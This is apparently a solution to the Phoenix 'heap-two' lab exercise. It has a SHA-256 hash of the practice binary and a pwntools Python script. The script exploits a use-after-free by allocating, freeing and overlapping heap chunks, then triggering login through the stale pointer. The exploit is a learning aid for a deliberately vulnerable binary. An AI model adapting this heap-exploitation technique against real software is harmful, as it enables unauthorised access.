```
2ef5c8cae179b2d1dcd9c94fec99254acc18e1db6340048293591d98aee2cadf  /opt/phoenix/amd64/heap-two
```

```py
#!/usr/bin/python
from pwn import *
io = process("/opt/phoenix/amd64/heap-two")

def leak(report=True):
    io.recvuntil("auth = ")
    leak_auth = int(io.recvuntil(',').split(',')[0], 16)
    io.recvuntil("service = ")
    leak_serv = int(io.recvuntil(']\n').split("]")[0], 16)
    if report: 
        log.info("[ auth = {}, service = {} ]".format(hex(leak_auth), hex(leak_serv)))
    io.sendline(b"")
    return (leak_auth, leak_serv)
def auth(name=b''):
    io.recvuntil("]\n")
    io.sendline(b"auth " + name)
def service(extra=b''):
    io.recvuntil("]\n")
    io.sendline(b"service" + extra)
def reset(extra=b''):
    (leak_auth, leak_serv) = leak(False)
    log.info("Called free on "+hex(leak_auth))
    io.recvuntil("]\n")
    io.sendline(b"reset" + extra)
def login(extra=b''):
    io.recvuntil("]\n")
    io.sendline(b"login" + extra)
    log.success(io.recvuntil("\n"))

##################################################
auth(b"A"*32) # pointer auth
reset() # free, mas o pointer nao e destruido
service(b"B"*32) # Alloc overlap
leak()
login() # pointer usado after free, apontando para service
```
